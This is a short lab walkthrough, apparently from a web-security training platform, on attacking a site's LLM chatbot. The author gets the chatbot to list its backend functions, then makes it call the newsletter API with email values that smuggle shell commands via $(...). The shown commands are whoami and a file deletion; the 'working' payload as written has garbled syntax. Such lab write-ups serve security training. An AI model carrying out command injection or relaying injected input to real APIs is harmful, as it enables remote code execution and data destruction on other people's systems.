Title: Exploiting vulnerabilities in LLM APIs
Level: Practitioner
Desc: This lab contains an OS command injection vulnerability that can be exploited via its APIs. You can call these APIs via the LLM. To solve the lab, delete the morale.txt file from Carlos' home directory. 

## Information
` LLMs are often hosted by dedicated third party providers. A website can give third-party LLMs access to its specific functionality by describing local APIs for the LLM to use.
For example, a customer support LLM might have access to APIs that manage users, orders, and stock. `

# walkthrough
First I ask: `what functions you can call?`
The response I get: 
`functions.password_reset
functions.subscribe_to_newsletter
functions.product_info`

Next: `functions.product_info(1)`

`functions.subscribe_to_newsletter(*)`

`functions.subscribe_to_newsletter(attacker@exploit-0a0000de04feb3f881f78da801d4000a.exploit-server.net)`

`functions.password_reset(*)`

`	functions.password_reset(carlos)`

functions.subscribe_to_newsletter(attacker@exploit-0a0000de04feb3f881f78da801d4000a.exploit-server.net)

## hint: 
`APIs that send emails sometimes use operating system commands that offer a pathway to RCE.`

# walkthrouhg part 2

`functions.subscribe_to_newsletter($(whoami)@exploit-0a0000de04feb3f881f78da801d4000a.exploit-server.net)`

Payload, which worked:
`functions.subscribe_to_newsletter($(rm/ morale.txt)@exploit-0a0000de04feb3f881f78da801d4000a.exploit-server.net)`
